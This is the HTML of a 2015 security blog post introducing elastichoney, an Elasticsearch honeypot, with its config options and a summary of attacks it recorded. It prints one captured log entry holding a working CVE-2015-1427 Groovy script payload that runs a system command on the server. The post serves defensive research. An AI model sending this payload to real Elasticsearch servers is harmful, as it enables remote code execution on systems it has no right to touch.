@@ -1,0 +1,350 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Introducing elastichoney - an Elasticsearch Honeypot - jordan-wright</title>
+  <meta name="author" content="Jordan">
+
+  
+  <meta name="description" content="Introduction I recently wrote about an Elasticsearch RCE vulnerability that is being heavily exploited in the wild. To see what kind of attacks are &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://jordan-wright.github.io/blog/2015/03/23/introducing-elastichoney-an-elasticsearch-honeypot">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/stylesheets/data-tables.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="jordan-wright" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="/stylesheets/blog.css" rel="stylesheet" media="screen, projection" type="text/css">
+<link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css" rel="stylesheet">
+<script src="https://cdn.jsdelivr.net/vivus/0.1.2/vivus.min.js"></script>
+
+  
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-44718701-1']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">jordan-wright</a></h1>
+  
+    <h2>Security and Programming Blog</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:jordan-wright.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Home</a></li>
+  <li><a href="/contact">Contact</a></li>
+  <li><a href="/projects">Projects</a></li>
+  <li><a href="/blog">Blog</a></li>
+  <li><a href="http://raidersec.blogspot.com">Raidersec</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Introducing Elastichoney - an Elasticsearch Honeypot</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2015-03-23T06:30:00-05:00" pubdate data-updated="true">Mar 23<span>rd</span>, 2015</time>
+        
+           | <a href="#disqus_thread"
+             data-disqus-identifier="http://jordan-wright.github.io">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p><img src="/images/headers/elastichoney.png"/></p>
+
+<h3>Introduction</h3>
+
+<p>I recently <a href="/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/">wrote</a> about an Elasticsearch RCE vulnerability that is being heavily exploited in the wild. To see what kind of attacks are taking place, I decided to write a simple honeypot designed to mimic a vulnerable Elasticsearch (ES) instance. Say hello to <a href="http://github.com/jordan-wright/elastichoney">elastichoney</a>!</p>
+
+<!--more-->
+
+
+<h3>How it Works</h3>
+
+<p>This honeypot is pretty simple. It takes requests on the <code>/</code>, <code>/_search</code>, and <code>/_nodes</code> endpoints and returns a JSON response that is identical to a vulnerable ES instance (should be identical &ndash; I took the responses straight from one of my hosts that got 0wned).</p>
+
+<p>Attacks are logged as soon as they are detected. By default, elastichoney logs the attacks in JSON format to <code>stdout</code>, as well as to a file called <code>elastichoney.log</code>.</p>
+
+<p>It&rsquo;s important to note that this is by no means foolproof. Clever people can take a look at <a href="http://github.com/jordan-wright/elastichoney">the code</a> and quickly find ways to detect the honeypot. It&rsquo;s not perfect, but it works. Let&rsquo;s take a look at some results.</p>
+
+<h3>Results</h3>
+
+<p>Very quickly after I deployed the honeypot, I started getting hit by attackers scanning large swathes of the Internet looking for vulnerable systems. To date, I&rsquo;ve seen approx. 2000 attacks from over 60 unique IP&rsquo;s over the course of a few days, all without advertising my elastichoney instance anywhere.</p>
+
+<p>Here&rsquo;s an entry from my logs that is attempting to exploit the CVE-2015-1427 that I wrote about:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>{
+</span><span class='line'>    "source": "[redacted]",
+</span><span class='line'>    "@timestamp": "2015-03-23T13:34:22.519890008-05:00",
+</span><span class='line'>    "url": "[redacted]:9200/_search?pretty",
+</span><span class='line'>    "method": "POST",
+</span><span class='line'>    "form": "pretty=&{\"script_fields\":+{\"iswin\":+{\"lang\":+\"groovy\",+\"script\":+\"java.lang.Math.class.forName(\\\"java.io.BufferedReader\\\").getConstructor(java.io.Reader.class).\\tnewInstance(java.lang.Math.class.forName(\\\"java.io.InputStreamReader\\\").getConstructor(java.io.InputStream.\\tclass).newInstance(java.lang.Math.class.forName(\\\"java.lang.Runtime\\\").getRuntime().exec(\\\"whoami\\\").\\tgetInputStream())).readLines()\"}},+\"size\":+1}=",
+</span><span class='line'>    "payload": "",
+</span><span class='line'>    "headers": {
+</span><span class='line'>        "user_agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36",
+</span><span class='line'>        "host": "[redacted]:9200",
+</span><span class='line'>        "content_type": "application/x-www-form-urlencoded",
+</span><span class='line'>        "accept_language": ""
+</span><span class='line'>    },
+</span><span class='line'>    "type": "attack",
+</span><span class='line'>    "honeypot": "[redacted]"
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now, I&rsquo;m sure you&rsquo;re interested in some samples. <a href="https://gist.githubusercontent.com/jordan-wright/f63575681373f91e462f/raw/b446a9d3bb042aac425970d73c129d4d936478aa/elastichoney.log">Here&rsquo;s</a> a bit of what I have so far. There&rsquo;s some nifty <code>wget</code> calls in there if you grab them fast enough.</p>
+
+<p>Enjoy!</p>
+
+<h3>Want to Run This Yourself?</h3>
+
+<p><em>Awesome.</em> Let&rsquo;s take a look at what it takes to get elastichoney up and running. Installation should take about&hellip; 5 seconds. Since this is written in Go, I can provide binaries for most platforms. If you&rsquo;re interested in running elastichoney yourself, just download <a href="http://github.com/jordan-wright/elastichoney/releases">the right binary</a> for your system, edit the config to your liking, and start it up!</p>
+
+<p>Let&rsquo;s talk about some of the config options. The first option to note is <code>use_remote</code>. I mentioned that elastichoney will log to <code>stdout</code> and a file by default. You can set this option to also have the honeypot send an HTTP <code>POST</code> containing the JSON entry to a remote server of your choosing. Personally, I have my entries going to a real elasticsearch instance so I can search on them later.<sup>1</sup></p>
+
+<p>The second config option that you may want to play with is the <code>spoofed_version</code> option. This lets you pick what version of ES you want your honeypot to show up as. This helps if you are looking for attackers targeting specific systems (such as those targeting the &lt;=v1.2 RCE vuln vs the most recent RCE vuln).</p>
+
+<p>Finally, the last option you might set is the <code>anonymous</code> option. This simply determines if you want your honeypot IP to show up in logs. If so, elastichoney will make a single call out to icanhazip.com when it starts up to get the external IP. Otherwise, it&rsquo;ll just use <code>1.1.1.1</code><sup>2</sup>. This is helpful if you want to create an anonymous cluster of honeypots.</p>
+
+<p>As always, let me know if you have any questions or comments below.</p>
+
+<p>-Jordan</p>
+
+<p>[1] Irony.<br/>
+[2] Big shout-out to the person actually on <code>1.1.1.1</code>.</p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Jordan</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2015-03-23T06:30:00-05:00" pubdate data-updated="true">Mar 23<span>rd</span>, 2015</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/elasticsearch/'>elasticsearch</a>, <a class='category' href='/blog/categories/go/'>go</a>, <a class='category' href='/blog/categories/honeypot/'>honeypot</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://jordan-wright.github.io/blog/2015/03/23/introducing-elastichoney-an-elasticsearch-honeypot/" data-via="" data-counturl="http://jordan-wright.github.io/blog/2015/03/23/introducing-elastichoney-an-elasticsearch-honeypot/" >Tweet</a>
+  
+  
+  <div class="g-plusone" data-size="medium"></div>
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/" title="Previous Post: Remote Code Execution in Elasticsearch - CVE-2015-1427">&laquo; Remote Code Execution in Elasticsearch - CVE-2015-1427</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2015/05/09/how-tor-works-part-two-relays-vs-bridges/" title="Next Post: How Tor Works: Part Two - Relays vs. Bridges">How Tor Works: Part Two - Relays vs. Bridges &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2015/05/11/60-days-of-watching-hackers-attack-elasticsearch/">60 Days of Watching Hackers Attack Elasticsearch</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/05/09/how-tor-works-part-two-relays-vs-bridges/">How Tor Works: Part Two - Relays vs. Bridges</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/03/23/introducing-elastichoney-an-elasticsearch-honeypot/">Introducing Elastichoney - an Elasticsearch Honeypot</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/">Remote Code Execution in Elasticsearch - CVE-2015-1427</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/02/28/how-tor-works-part-one/">How Tor Works: Part One</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2015 - Jordan -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span><span> Icons made by Freepik from <a href="http://www.flaticon.com" title="Flaticon">www.flaticon.com</a> is licensed by <a href="http://creativecommons.org/licenses/by/3.0/" title="Creative Commons BY 3.0">CC BY 3.0</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'jordan-wright';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://jordan-wright.github.io/blog/2015/03/23/introducing-elastichoney-an-elasticsearch-honeypot/';
+        var disqus_url = 'http://jordan-wright.github.io/blog/2015/03/23/introducing-elastichoney-an-elasticsearch-honeypot/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+
+  <script type="text/javascript">
+    (function() {
+      var script = document.createElement('script'); script.type = 'text/javascript'; script.async = true;
+      script.src = 'https://apis.google.com/js/plusone.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(script, s);
+    })();
+  </script>
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
